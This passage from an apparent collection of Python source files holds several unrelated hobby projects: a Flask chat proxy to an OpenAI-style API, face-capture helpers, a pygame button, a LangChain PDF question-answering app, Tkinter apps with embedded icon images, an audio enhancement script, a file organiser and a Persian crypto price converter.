\"stream\": False\n        }, ensure_ascii=False)\n        headers = {\n            'Authorization': f'Bearer {openai_api_key}',\n            'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',\n            'Content-Type': 'application/json'\n        }\n\n        print('req: ', payload)\n        res = requests.post(url=url, data=payload.encode('utf-8'), headers=headers, verify=False)\n    \n        print(res.text)\n        if 'error' in res.text:\n            print(\"\u6b63\u5728\u91cd\u8bd5\u4e2d...\")\n            continue\n        return res.json()['choices'][0]['message']\n\n\n\n@app.route('/v1/chat', methods=['POST'])\ndef chat():\n    args = request.get_json()\n    print('\u63a5\u6536\u5230\u7528\u6237\u8f93\u5165\uff1a', args)\n    driver = args['driver']\n    text = args['text']\n    messages = find_driver_message(driver)\n    messages.append({\n        'role': 'user',\n        'content': text\n    })\n    res_message_item = send_text_to_gpt(messages)\n    save_driver_message(driver, res_message_item)\n    content = res_message_item['content']\n    \n    # \u521b\u5efa\u4e00\u4e2aResponse\u5bf9\u8c61\uff0c\u8bbe\u7f6e\u5185\u5bb9\u4e3a\u5b57\u7b26\u4e32\"\u6211\u5f88\u597d\"\uff0c\u7f16\u7801\u4e3aUTF-8\n    response_content = content\n    # response_content = \"\u54c8\u54c8\u54c8\"\n    response = Response(response_content, status=200, content_type='text/plain; charset=utf-8')\n\n    return response\n\n    \n\nif __name__ == '__main__':\n    # \u5224\u65ad\u73af\u5883\u53d8\u91cf\u662f\u5426\u90fd\u8bbe\u7f6e\n    if not all([openai_api_base_url, openai_api_key, prompt]):\n        print('\u73af\u5883\u53d8\u91cf\u672a\u8bbe\u7f6e')\n        exit(1)\n    app.run(host='0.0.0.0', port=3026, debug=True)",
    "import os\nimport cv2\n\ndef pre_work_mkdir(path_photos_from_camera):\n    if not os.path.isdir(path_photos_from_camera):\n        os.makedirs(path_photos_from_camera)\n\ndef check_existing_faces_cnt(path):\n    if os.listdir(path):\n        person_list = os.listdir(path)\n        person_num_list = []\n        for person in person_list:\n            person_order = person.split(\"_\")[1].split(\"_\")[0]\n            person_num_list.append(int(person_order))\n        return max(person_num_list)\n    else:\n        return 0\n    \ndef create_face_folder(input_name_char, path_photos_from_camera, path):\n    global current_face_dir\n    global face_folder_created_flag\n    global ss_cnt\n    global existing_faces_cnt\n\n    already_exist_flag = False\n    already_exist_folder_name = \"\"\n\n    person_list = os.listdir(path)\n    for person in person_list:\n        if input_name_char in person:\n            already_exist_flag = True\n            already_exist_folder_name = person\n            break\n\n    if already_exist_flag == False:\n        existing_faces_cnt = check_existing_faces_cnt(path)\n        existing_faces_cnt += 1\n\n        person_face_folder = (\n            path_photos_from_camera\n            + \"person_\"\n            + str(existing_faces_cnt)\n            + \"_\"\n            + input_name_char\n        )\n\n        if not os.path.exists(person_face_folder):\n            os.makedirs(person_face_folder)\n            current_face_dir = person_face_folder\n            face_folder_created_flag = True\n            ss_cnt = 0\n        else:\n            face_folder_created_flag = False\n\n    else:\n        current_face_dir = path_photos_from_camera + already_exist_folder_name\n        face_folder_created_flag = True\n        existing_img_cnt = len(os.listdir(current_face_dir))\n        ss_cnt = existing_img_cnt\n\n    return current_face_dir, face_folder_created_flag\n\ndef save_current_face(face_ROI_image, current_face_dir, current_frame_faces_cnt, out_of_range_flag):\n    global ss_cnt\n    global face_folder_created_flag\n    \n    #cv2.imwrite('face.jpg', face_ROI_image)\n\n    if face_folder_created_flag:\n        if current_frame_faces_cnt == 1:\n            if not out_of_range_flag:\n                ss_cnt += 1\n                cv2.imwrite(\n                    current_face_dir +\n                    f\"/img_face_{ss_cnt}.jpg\", face_ROI_image\n                )\n                return {\"status\": \"success\", \"message\": \"Face saved successfully\"}\n            else:\n                return {\"status\": \"failed\", \"message\": \"Out of range\"}\n        else:\n            return {\"status\": \"failed\", \"message\": \"No face detected or multiple faces detected\"}\n    else:\n        return {\"status\": \"failed\", \"message\": \"Folder creation failed\"}\n\n#export",
    "import pygame.font\n\nclass Button:\n\n    def __init__(self, ai_game, msg):\n        \"\"\"Initialize button attributes.\"\"\"\n        self.screen = ai_game.screen\n        self.screen_rect = self.screen.get_rect()\n\n        # Set the dimensions and properties of the button.\n        self.width, self.height = 200, 50\n        self.button_color = (0, 255, 0)\n        self.text_color = (255, 255, 255)\n        self.font = pygame.font.SysFont(None, 48)\n\n        # Build the button's rect object and center it.\n        self.rect = pygame.Rect(0, 0, self.width, self.height)\n        self.rect.center = self.screen_rect.center\n\n        # The button message needs to be prepped only once.\n        self._prep_msg(msg)\n\n    def _prep_msg(self, msg):\n        \"\"\"Turn message into a rendered image and center text on the button.\"\"\"\n        self.msg_image = self.font.render(msg, True, self.text_color, self.button_color)\n        self.msg_image_rect = self.msg_image.get_rect()\n        self.msg_image_rect.center = self.rect.center\n\n    def draw_button(self):\n        # Draw blank button and then draw message.\n        self.screen.fill(self.button_color, self.rect)\n        self.screen.blit(self.msg_image, self.msg_image_rect)",
    "import os\n\nfrom langchain.llms import OpenAI\nfrom langchain.embeddings import OpenAIEmbeddings\n\nimport streamlit as st\n\nfrom langchain.document_loaders import PyPDFLoader\nfrom langchain.vectorstores import Chroma\n\nfrom langchain.agents.agent_toolkits import (\n    create_vectorstore_agent,\n    VectorStoreToolkit,\n    VectorStoreInfo)\nfrom dotenv import load_dotenv\nimport os\n\nload_dotenv()\n\nos.environ['OPENAI_API_KEY'] = os.getenv(\"API_KEY\")\n\nllm = OpenAI(temperature=0.1, verbose=True)\nembeddings = OpenAIEmbeddings()\n\nwith st.sidebar:\n    st.title(\"RAG app\")\n    choice = st.radio(\"Navigation\", [\"Upload File\",\"Get Answer\"])\n    st.info(\"This application is designed to allow ChatGPT or other LLMs to answer highly targeted questions using your files!\")\n\nif choice == \"Upload File\":\n    st.title(\"Upload File\")\n\n    name = st.text_input(\"enter a name of project\")\n\n    desc = st.text_input(\"enter a description of project\")\n\n    if not name:\n        name = \"default\"\n\n    if not desc:\n        desc = \"default\"\n\n\n\n    file = st.text_input(\"Enter path or url to file\") # st.file_uploader(\"Upload a file\", type=[\"pdf\"])\n\n\n    if st.button(\"Create Project\"):\n        if file is not None:\n            # file_path = os.path.join(file.temporary_folder, file.name)\n            \n            loader = PyPDFLoader(file)\n            pages = loader.load_and_split()\n            store = Chroma.from_documents(pages, embeddings, collection_name=name)\n\n            vectorstoreinfo = VectorStoreInfo(vectorstore=store,name=name, description=desc)\n            \n            toolkit = VectorStoreToolkit(vectorstore_info=vectorstoreinfo)\n            st.session_state.agent = create_vectorstore_agent(llm, toolkit, verbose=True)\n            \n            st.write(\"Success!\")\n\nif choice == \"Get Answer\":\n    prompt = st.text_input('Input your prompt here')\n\n    if prompt and st.button(\"Get Answer\"):\n        response = st.session_state.agent.run(prompt)\n\n        st.write(response)\n\n        with st.expander('Document Similarity Search'):\n            search = store.similarity_search_with_score(prompt)\n            if search:\n                st.write(search[0][0].page_content) ",
    "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nPython Desktop application using Tkinter to perform basic mathematical calculations\nAuthor: Reshma\n\"\"\"\n\n# Importing Tkinter\nimport tkinter as tk\n\n# Class containing base64 format of icon pictures to use in this application\nclass Icons:\n    PLAY_AGAIN_IMAGE = r\"iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAACXBIWXMAAAsTAAALEwEAmpwYAAABaUlEQVR4nO3YoUuDQRgG8OcmH4IWv6YrCq6KQ3BFbAsGkywJYjeISZPMsKhgMFmGDPSw6l9g0j9As1abFg3iY7mB8cM79957XHj6/XZ3e5/7QGuYQiC9gAyxeUeM+PFhviM20R053ACv9xKAbK6AANheAB+PE4AAYDEG7q6Bb33lELjMTIEXO4bfV8ohcFmeB+97CUAAsGbArVXw9Vw5BC7lJHi6bfh1qRwCl8VZ8O4oAQhc1pfA57MEIAA4MQ52O+DHQDkELo3p/2kHGDVkmNDtAFKQ0O0AkpBh6qV/O0AMkN/t4KGXAAQe7SA6CP7YDqKFwKU5V60dZAjy0UL6l73VUP73q34gFq6ivPeVl8anE38AJWv8zX44AKUeVp8D5U/dF81P3WbFehEtpNT+OaiWwge6lsdUjgJSDzCVRSFFwKksBmkHnsojh3Q74O2B/KLpC4k5kF5Ahti8I0b8+DDfESv/S1fdkR+NGFimnW+wfgAAAABJRU5ErkJggg==\"\n    RESET_IMAGE = r\"iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAAAsTAAALEwEAmpwYAAACa0lEQVR4nO2XS0vjUBTH+00i1aVo3RYfG8GNCzfu1IUbxYpguxLd+QXERy2u3LjwgfopEiZgZ4aZsU2DU9BKxyr4TB9pk/9wCmbmtk1oMonOMPnDWZR7c8+Pc8859zTAcxz+Zgu8NwDvA3J+BLl3zzPeLxLuH49gdnUV5ctLfBwefnvAD93dyMzPIxeP4/b0FIXDQ1wnEsgsLEDs6cHX8XHo1SpI+d3dtwM86+/H7ckJdFWFmWit9vRk/K7k8+A7OrwHvFhaglapmIJZ6cvYmLeAdJVm0kol1F5eLAGvt7e9A6TINUqRJMjRKMTeXmPf+eQkoOstAUvZrDeAZ+EwNEVho5FIQAgGmX1CVxeKmYxlFD+NjLgPWDg+ZuF2dlruSw4OmkbvVanpaXcBqV1o5bLhoCjLEDo7TfdTIUhzcy3t28SErUpuC1CKRJgIyLGYrTzi/8ACTipXDIUcOROCQZxPTeHz6Ki7gPQ6vKp6f+84Gj/29oxz6PXxBvDx0TGgendnnHOzv+/iFW9u/rpfXYfY12cbTgyFmDTJbWy4B5iemWGLZHHRNqAcjTJnUOG5BkgR+73NKOl0U4PmLYxaEr04xiWoan0Kcg2Q7ObggL2ieLxtwMYuUDg6avvbtgGTQ0PQisUmSMGiYdNaIxwNFMmBAfcByS6WlxlnxrAQizG9kVKCck5JpdAoGjg8Hbeu1tdhptrzM6oPD6brdtLCMSDZ95WVpsnGSpQa9I0TX85H/nC4nuyUU2aiaqU9lL9O/bjyp0mKRHC1tlaHoecst7UFaXbW8ZvtKiDvsfmAvB9Bzs9B+EXC/89t5idwwi3n/8uhwgAAAABJRU5ErkJggg==\"\n    PLAYERX = r\"iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAAAsTAAALEwEAmpwYAAADkklEQVR4nO2X20sVYRTF55SmpSUqlholVPZgooGhVL4EhVBRpBBEpmJSD6EPRVcoMyJCJJAIowv00oVunJLypZumcQpCO5SWXf6VXyw2w2TnaKlzPEHnYV6++b6ZNWvvtdYeB8fhX76ceAMgAdBJMOjEvc/4f0QSCEBGBuTmwrx5f39uzhxYtAiysmDWrBgB1Evq6+HlS/j4Ee7ehdLSP58TsAsX4MMHCIXgyBFYsCAGADduhNFROH0aamrg6VN4/hyWLBn/TEoKnD8P4TDU1UFzM3z5Avv3xwDguXPQ3e2VduVKePsW2tsNSLQz1dXw7Zt9kNpD5e3qglu3YPZsnwEePgyvX8PChZEAduyI3F9YGPkBOTnw7Jmx6juDq1ZZqQQ0KcnWUlOho8N6a/lyb29aGly5Ai9eeC2gHj51ynpRz/IdoMrT1GR9WFXlrS9dCr29VjqVX6VsaICvX61v3X3btxvbe/bYHt8B6hKAzk7o7x/L2KZNBqi21pQtlk6ehORku19UBO/fG9tz58bYqAsK4NUruHoV5s/3ytfWBp8+mQ09emT9pnvyvtu3TfX5+TOUJBs2mF0cOOCpMTMTjh0zz5PCtSYGjx833ywvn/x7pgxQoFpa4PNnqKwcf9/mzdaz6slJ9N30AepS5N24YbYRzazF4rt31rOTiUXfALogQiEr4+/3VO6BAVP5NN4xdYAq2bZtlq3RfE1lHRmBioo4ASwuhsFBaG2NPqFINFJvTw/k5c0wQPflT57Y6OWuK9J+zVjX/xR3Sp0ZAaiYO3QIhofHlm/9enjwAC5ehMWLI/N6164pKdmZkgfKOvbt80q7bJkJ4s4dU65AusoVqzJxpcvfzI/TAig7UVJcuwbp6bYmIJcuQV+fpYxiT4zt3et9gFIlGDSGf52GfAWoDFVKvHkDK1bYWiAAjY3GqDsYKD2OHrX0WLPGO796tU1DGnjdjPYVoFJBA8HWrd5aWZkBkee5I5ibv/fuwePHHmP6GA0Tisi1a30GqIdfvw43b44dPoNBuH8fsrMjz5SUwNAQnDljw4SbPkqeEyd8BqhecgFqglHfqVTh8PiNr4+ScsX6zp3GsKYZTeUHD8agxOoxJYP+Sx4+hB8/YPfuia1D3nf2LHz/bgrXT5ZULn/0HaAYWLfOhs7Ll2HLFq90E11Su/7opHzZjRIoZhN1HC4n3gBIAHQSDDpx7zMSInFix+BPJ0xlak8pwJwAAAAASUVORK5CYII=\"\n    PLAYERO = r\"iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAAAsTAAALEwEAmpwYAAACw0lEQVR4nO2Yy07bUBCG8wZnBV5yWQNrLhvgEYAV7AkBXgITe1G6KRcBKhICkUqtBElgXdwd7aJJhEr33JxlSUAiURFT/VbOkVPJ92OoKo80UoTt8aeZ88+MSTGV0b/sqdcGYAmgmmSQ/f8i6V7ppqGtIZr6MGU5fuNvrwo4sDpA+hedKmaFnAzXNEOj/tX+lwPsfdtLm982qfnUdAT72xpPDdr4ukE9Kz3xAo7vjFO1Xm17ea1Ro8Mfh5Q1spQpZizH76OLI6o36m33mnWTxnbG4gGc+TRDj78fxcsuf13SbH6WOrQOx2dwLV1I09XdlXgOMaY/TssFRObscLvfd6lT6/T9EkVXaL+03wbpN5MpP2fOXtalz0uhD/zy6XJbuf2cSU9ACILbQfkgNBxrObLPDcKJBIhWwtWKMxekrMyl3Nd310LdXi3IFRB9jhsEERWOtXyuOCfiok+GBjyvnotW4qZWFtBRCd6C0MxDAWJUPdOzFQR9ThYca3n+Im/FxjvcxqIj4Mj2iCiDeqpKB9QMTcQf3h4ODoihz23+eF464MLxgog/mZsMDoiHuCGYbMDFk0URfyI3ERwQaeeGBisbULd1CKxnkUSCwS8bsPCzIETS9aYrOCCc73oPzQcpTZq1HLHum/dW7JJZcr035Vdp2EpkAWaKGREXq1loQIwhjCMYViaMqahwiq7QTe1GjLq+d33hAeEY6NxylVxkwL3Snoi3drbmeb8nIFYirEYyFJ01siLObe3W14eVr4UVy6V9YcXyGaTciq5Y2eeGWKPvR+Wu/FjT7ZBYmdKFtKu6cQ2C4GcutpXfnkl7uWFoF+iTUDxGIhxNGMsAbyX2svrNXChAfiYhHK5uP4Z718/WQ33Mh/5wRwvSDM3xwx0TomyWLWF4tZJYAN3+9TG4Neg6vl4ckMXoCSBLMqgmZ5DcRPIHUnH5pi5xpSMAAAAASUVORK5CYII=\"\n    TICTACTOE_IMAGE = r\"iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAIg0lEQVR4nO2bf1AT6RnHU6+duWmvf7SdXv+5zrT/9I925uaInbF4iZwnBO4QbA+xVE+iPZVrPc8EiChkszFgNgGV8/gVLAgalAPlACUGVAQUhPzYkB9cNkePO7FWwk8l8XrTa8+ns0sXMCSyS0N6h3lmvrObd/aZ7PN5f+y+z/suhxO2sFGG8LmxMh73bzIetweNfPF5zgqzQ7yXfozyI7pl/IhhhL86fsEFMh63C+VzgdSJuEhNV9qmHStJJ15bW0LHh/K4txYC4HNt9AWVm6I+vfH2JlhJImOi4yNjDQPwNVm4BXBnu4CMF5HDYWhNOsPtxhbDDs4SrVHf+7MmnRHI45L8dQZ5U4uhc7HryJgYdwFZGEBEuAVwAph518Ftpp0HDpDC38oSd1a1jJqK6vPdIiya1IgIe/WO+NgPA/lHdXR8e4vL9fKWjz+OJrXPPrBN02EB8kiXJTudUcLPPnvWn39MgfX5aLVtQ2y+PZpUntZ85nityUb/pqT66FfL0gUMOyVF+pR3gJYzDQG3GFsoEUYEApDscimTXS5goJoFvvX1zwhUjlGB2gFPlMr+KAazrQs6gFvCjLb5AD7ZKw8E4IsnAKhhAmAzQXT7+kahA88tGjwtzJG67AA+",
    "import argparse\nimport random\nimport time\nfrom pathlib import Path\n\nimport torch\nimport torchaudio\nfrom tqdm import tqdm\n\nfrom .inference import denoise, enhance\n\n\n@torch.inference_mode()\ndef main():\n    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n    parser.add_argument(\"in_dir\", type=Path, help=\"Path to input audio folder\")\n    parser.add_argument(\"out_dir\", type=Path, help=\"Output folder\")\n    parser.add_argument(\n        \"--run_dir\",\n        type=Path,\n        default=None,\n        help=\"Path to the enhancer run folder, if None, use the default model\",\n    )\n    parser.add_argument(\n        \"--suffix\",\n        type=str,\n        default=\".wav\",\n        help=\"Audio file suffix\",\n    )\n    parser.add_argument(\n        \"--device\",\n        type=str,\n        default=\"cuda\",\n        help=\"Device to use for computation, recommended to use CUDA\",\n    )\n    parser.add_argument(\n        \"--denoise_only\",\n        action=\"store_true\",\n        help=\"Only apply denoising without enhancement\",\n    )\n    parser.add_argument(\n        \"--lambd\",\n        type=float,\n        default=1.0,\n        help=\"Denoise strength for enhancement (0.0 to 1.0)\",\n    )\n    parser.add_argument(\n        \"--tau\",\n        type=float,\n        default=0.5,\n        help=\"CFM prior temperature (0.0 to 1.0)\",\n    )\n    parser.add_argument(\n        \"--solver\",\n        type=str,\n        default=\"midpoint\",\n        choices=[\"midpoint\", \"rk4\", \"euler\"],\n        help=\"Numerical solver to use\",\n    )\n    parser.add_argument(\n        \"--nfe\",\n        type=int,\n        default=64,\n        help=\"Number of function evaluations\",\n    )\n    parser.add_argument(\n        \"--parallel_mode\",\n        action=\"store_true\",\n        help=\"Shuffle the audio paths and skip the existing ones, enabling multiple jobs to run in parallel\",\n    )\n\n    args = parser.parse_args()\n\n    device = args.device\n\n    if device == \"cuda\" and not torch.cuda.is_available():\n        print(\"CUDA is not available but --device is set to cuda, using CPU instead\")\n        device = \"cpu\"\n\n    start_time = time.perf_counter()\n\n    run_dir = args.run_dir\n\n    paths = sorted(args.in_dir.glob(f\"**/*{args.suffix}\"))\n\n    if args.parallel_mode:\n        random.shuffle(paths)\n\n    if len(paths) == 0:\n        print(f\"No {args.suffix} files found in the following path: {args.in_dir}\")\n        return\n\n    pbar = tqdm(paths)\n\n    for path in pbar:\n        out_path = args.out_dir / path.relative_to(args.in_dir)\n        if args.parallel_mode and out_path.exists():\n            continue\n        pbar.set_description(f\"Processing {out_path}\")\n        dwav, sr = torchaudio.load(path)\n        dwav = dwav.mean(0)\n        if args.denoise_only:\n            hwav, sr = denoise(\n                dwav=dwav,\n                sr=sr,\n                device=device,\n                run_dir=args.run_dir,\n            )\n        else:\n            hwav, sr = enhance(\n                dwav=dwav,\n                sr=sr,\n                device=device,\n                nfe=args.nfe,\n                solver=args.solver,\n                lambd=args.lambd,\n                tau=args.tau,\n                run_dir=run_dir,\n            )\n        out_path.parent.mkdir(parents=True, exist_ok=True)\n        torchaudio.save(out_path, hwav[None], sr)\n\n    # Cool emoji effect saying the job is done\n    elapsed_time = time.perf_counter() - start_time\n    print(f\"\ud83c\udf1f Enhancement done! {len(paths)} files processed in {elapsed_time:.2f}s\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import os \nimport sys\nimport shutil\n\ndef retrieve_folder_path():\n    while True:\n        folder = input(\"Enter the folder name: \")\n        if os.path.exists(folder):\n            return folder\n        else:\n            print(\"Folder does not exist. Please enter a valid folder name.\")\n\ndef main():\n    global folder_path \n    if len(sys.argv) < 2:\n        folder_path = retrieve_folder_path()\n    else:\n        folder_path = sys.argv[1]\n        if not os.path.exists(folder_path):\n            print(\"Specified folder does not exist.\")\n            folder_path = retrieve_folder_path()\n\n    print(\"Folder path:\", folder_path)\n    return folder_path\n\ndef file_type(file):\n    image_extensions = ['.jpg', '.jpeg', '.jpe', '.jif', '.jfif', '.jfi', '.png', '.gif', '.webp', '.tiff', '.tif', '.bmp', '.heif', '.heic', '.svg', '.svgz']\n    video_extensions = ['.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv', '.webm', '.m4v', '.3gp', '.mpeg', '.mpg', '.rm', '.rmvb', '.vob']\n    text_extensions = ['.txt', '.doc', '.docx', '.rtf', '.pdf', '.html', '.htm', '.xml', '.csv', '.json', '.log']\n    sound_extensions = ['.mp3', '.wav', '.ogg', '.flac', '.aac', '.wma', '.m4a', '.opus']\n    application_extensions = ['.exe', '.dmg', '.apk', '.app', '.deb', '.rpm', '.msi', '.jar', '.bat', '.sh']\n    archive_extensions = ['.zip']\n\n    file_extension = os.path.splitext(file)[1]\n    if file_extension in image_extensions:\n        return \"IMAGE\"\n    elif file_extension in video_extensions:\n        return \"VIDEO\"\n    elif file_extension in text_extensions:\n        return \"TEXT\"\n    elif file_extension in sound_extensions:\n        return \"SOUND\"\n    elif file_extension in application_extensions:\n        return \"APPLICATION\"\n    elif file_extension in archive_extensions:\n        return \"ARCHIVE\"\n    else:\n        return \"UNKNOWN-TYPE\"\n\n\nfolder_path = main()\n\nfolder_contents = os.listdir(folder_path)\nimages = []\nvideos = []\ntext = []\napp = []\nsound = []\narchive = []\nunknown_type = []\n\nfor file_name in folder_contents:\n    if os.path.isfile(os.path.join(folder_path, file_name)):\n        file_category = file_type(file_name)\n        if file_category == \"IMAGE\":\n            images.append(file_name)\n        elif file_category == \"VIDEO\":\n            videos.append(file_name)\n        elif file_category == \"TEXT\":\n            text.append(file_name)\n        elif file_category == \"SOUND\":\n            sound.append(file_name)\n        elif file_category == \"APPLICATION\":\n            app.append(file_name)\n        elif file_category == \"ARCHIVE\":\n            archive.append(file_name)\n        else:\n            unknown_type.append(file_name)\n\nimages_folder = os.path.join(folder_path, 'images_folder(file_manager)')\nvideos_folder = os.path.join(folder_path, 'videos_folder(file_manager)')\nsound_folder = os.path.join(folder_path, 'sound_folder(file_manager)')\ntext_folder = os.path.join(folder_path, 'text_folder(file_manager)')\napplications_folder = os.path.join(folder_path, 'applications_folder(file_manager)')\narchive_folder = os.path.join(folder_path, 'archive_folder(file_manager)')\nunknown_folder = os.path.join(folder_path, 'unknown_folder(file_manager)')\n\ndef move_files(list_of_files, destination_folder):\n    for file_name in list_of_files:\n        source_path = os.path.join(folder_path, file_name)\n        destination_path = os.path.join(destination_folder, file_name)\n        shutil.move(source_path, destination_path)\n\nif images:\n    os.makedirs(images_folder, exist_ok=True)\nif videos:\n    os.makedirs(videos_folder, exist_ok=True)\nif sound:\n    os.makedirs(sound_folder, exist_ok=True)\nif text:\n    os.makedirs(text_folder, exist_ok=True)\nif app:\n    os.makedirs(applications_folder, exist_ok=True)\nif archive:\n    os.makedirs(archive_folder, exist_ok=True)\nif unknown_type:\n    os.makedirs(unknown_folder, exist_ok=True)\n\n\nmove_files(images, images_folder)\nmove_files(videos, videos_folder)\nmove_files(sound, sound_folder)\nmove_files(text, text_folder)\nmove_files(app, applications_folder)\nmove_files(archive, archive_folder)\nmove_files(unknown_type, unknown_folder)\n",
    "import locale\r\nfrom pycoingecko import CoinGeckoAPI\r\nimport tkinter as tk\r\nfrom tkinter import ttk, simpledialog\r\nimport threading\r\nimport webbrowser\r\n\r\n# \u062a\u0646\u0638\u06cc\u0645\u0627\u062a \u0645\u062d\u0644\u06cc \u0628\u0631\u0627\u06cc \u0627\u0633\u062a\u0641\u0627\u062f\u0647 \u0627\u0632 \u062c\u062f\u0627\u06a9\u0646\u0646\u062f\u0647\u200c\u0647\u0627\u06cc \u0647\u0632\u0627\u0631\u06af\u0627\u0646\r\nlocale.setlocale(locale.LC_ALL, '')\r\n\r\ndef get_crypto_prices(coins):\r\n    cg = CoinGeckoAPI()\r\n    prices = cg.get_price(ids=','.join(coins), vs_currencies='usd')\r\n    return prices\r\n\r\ndef format_number(number):\r\n    return locale.format_string(\"%d\", number, grouping=True)\r\n\r\ndef convert_to_toman(amount_usd, rate):\r\n    return format_number(amount_usd * rate)\r\n\r\ndef convert_from_toman(amount_toman, rate, price_usd):\r\n    converted_amount = amount_toman / rate / price_usd\r\n    return \"{:.6f}\".format(converted_amount)  # \u0628\u0631\u0627\u06cc \u0646\u0645\u0627\u06cc\u0634 \u062f\u0642\u06cc\u0642\u200c\u062a\u0631 \u0627\u0639\u062f\u0627\u062f \u0628\u0627 \u0627\u0639\u0634\u0627\u0631\r\n\r\ndef update_prices(labels, coins, rate):\r\n    prices = get_crypto_prices(coins)\r\n    for coin in coins:\r\n        if coin in prices:\r\n            price_usd = prices[coin]['usd']\r\n            price_toman = convert_to_toman(price_usd, rate)\r\n            labels[coin].config(text=f\"{coin.capitalize()}: ${price_usd} / {price_toman} \u062a\u0648\u0645\u0627\u0646\")\r\n        else:\r\n            labels[coin].config(text=f\"{coin.capitalize()}: \u0645\u0634\u06a9\u0644\u06cc \u0647\u0646\u06af\u0627\u0645 \u067e\u0631\u062f\u0627\u0632\u0634 \u0642\u06cc\u0645\u062a \u0628\u0647 \u0645\u0634\u06a9\u0644\u06cc \u0628\u0647 \u0648\u062c\u0648\u062f \u0622\u0645\u062f\")\r\n\r\ndef display_prices(rate):\r\n    for widget in canvas_frame.winfo_children():\r\n        widget.destroy()\r\n\r\n    labels = {}\r\n    coins =  [\r\n    \"bitcoin\",\r\n]\r\n    \r\n    #  \"ethereum\", \"litecoin\", \"ripple\", \"cardano\",\r\n    # \"dogecoin\", \"polkadot\", \"binancecoin\", \"solana\", \"uniswap\",\r\n    # \"chainlink\", \"stellar\", \"bitcoin-cash\", \"usd-coin\", \"cosmos\",\r\n    # \"monero\", \"tron\", \"iota\", \"neo\", \"tezos\", \"aave\", \"algorand\", \r\n    # \"vechain\", \"terra-luna\", \"axie-infinity\"\r\n\r\n    for coin in coins:\r\n        labels[coin] = tk.Label(canvas_frame, text=f\"{coin.capitalize()}: \u062f\u0631 \u062d\u0627\u0644 \u0628\u0627\u0631\u06af\u0630\u0627\u0631\u06cc\", font=(\"Arial\", 14))\r\n        labels[coin].pack()\r\n\r\n    threading.Thread(target=update_prices, args=(labels, coins, rate), daemon=True).start()\r\n\r\ndef ask_amount_and_convert(selected_coin, rate, prices, output_text, to_toman):\r\n    if to_toman:\r\n        amount_crypto = simpledialog.askfloat(\"\u062a\u0628\u062f\u06cc\u0644\", f\"\u0645\u0642\u062f\u0627\u0631 {selected_coin.upper()} \u0631\u0627 \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f:\", minvalue=0.0)\r\n        if amount_crypto is not None and selected_coin in prices:\r\n            price_usd = prices[selected_coin]['usd']\r\n            converted_amount = convert_to_toman(amount_crypto * price_usd, rate)\r\n            output_text.insert(tk.END, f\"\u062a\u0628\u062f\u06cc\u0644 {amount_crypto:.6f} {selected_coin.upper()} \u0628\u0647 \u062a\u0648\u0645\u0627\u0646:\\n{converted_amount} \u062a\u0648\u0645\u0627\u0646\\n\\n\")\r\n    else:\r\n        amount_toman = simpledialog.askfloat(\"\u062a\u0628\u062f\u06cc\u0644\", \"\u0645\u0628\u0644\u063a \u0628\u0647 \u062a\u0648\u0645\u0627\u0646 \u0631\u0627 \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f:\", minvalue=0.0)\r\n        if amount_toman is not None and selected_coin in prices:\r\n            price_usd = prices[selected_coin]['usd']\r\n            converted_amount = convert_from_toman(amount_toman, rate, price_usd)\r\n            output_text.insert(tk.END, f\"\u062a\u0628\u062f\u06cc\u0644 {amount_toman} \u062a\u0648\u0645\u0627\u0646 \u0628\u0647 {selected_coin.upper()}:\\n{converted_amount} {selected_coin.upper()}\\n\\n\")\r\n\r\ndef open_link(url):\r\n    webbrowser.open_new(url)\r\n\r\nwindow = tk.Tk()\r\nwindow.title(\"\u062a\u06a9\u0644\u06cc\u0641 \u0633\u06cc\u062f \u0633\u0647\u06cc\u0644 \u0645\u0648\u0633\u0648\u06cc \u0628\u0647 \u0627\u0633\u062a\u0627\u062f \u0635\u0627\u0628\u0631\u06cc\")\r\nwindow.geometry(\"500x700\")\r\n\r\nusd_to_toman_rate = 42075  # \u0646\u0631\u062e \u062a\u0628\u062f\u06cc\u0644 \u062a\u0648\u0645\u0627\u0646 \u0628\u0647 \u062f\u0644\u0627\u0631\r\n\r\nlink = tk.Label(window, text=\"\u062a\u06a9\u0644\u06cc\u0641 \u0633\u06cc\u062f \u0633\u0647\u06cc\u0644 \u0645\u0648\u0633\u0648\u06cc \u0628\u0647 \u0627\u0633\u062a\u0627\u062f \u0635\u0627\u0628\u0631\u06cc\", font=(\"Arial\", 10), fg=\"blue\", cursor=\"hand2\")\r\nlink.pack(side=\"top\", fill=\"x\")\r\n\r\n\r\ncanvas = tk.Canvas(window)\r\nscrollbar = ttk.Scrollbar(window, orient=\"vertical\", command=canvas.yview)\r\nscrollable_frame = tk.Frame(canvas)\r\n\r\nscrollable_frame.bind(\r\n    \"<Configure>\",\r\n    lambda e: canvas.configure(\r\n        scrollregion=canvas.bbox(\"all\")\r\n    )\r\n)\r\n\r\ncanvas.create_window((0, 0), window=scrollable_frame, anchor=\"nw\")\r\ncanvas.configure(yscrollcommand=scrollbar.set)\r\n\r\ncoins =  [\r\n        \"\u0628\u06cc\u062a \u06a9\u0648\u06cc\u0646\", \r\n    ]\r\n\r\n# \"\u0627\u062a\u0631\u06cc\u0648\u0645\", \"\u0644\u0627\u06cc\u062a \u06a9\u0648\u06cc\u0646\", \"\u0631\u06cc\u067e\u0644\", \"\u06a9\u0627\u0631\u062f\u0648\u0646\u0648\",\r\n#         \"\u062f\u0648\u062c \u06a9\u0648\u06cc\u0646\", \"\u067e\u0648\u0644\u06a9\u0627\u062f\u0627\u062a\", \"\u0628\u0627\u06cc\u0646\u0633 \u06a9\u0648\u06cc\u0646\", \"\u0633\u0648\u0644\u0627\u0646\u0627\", \"\u06cc\u0648\u0646\u06cc \u0633\u0648 \u0627\u067e\",\r\n#         \"\u0686\u06cc\u0646 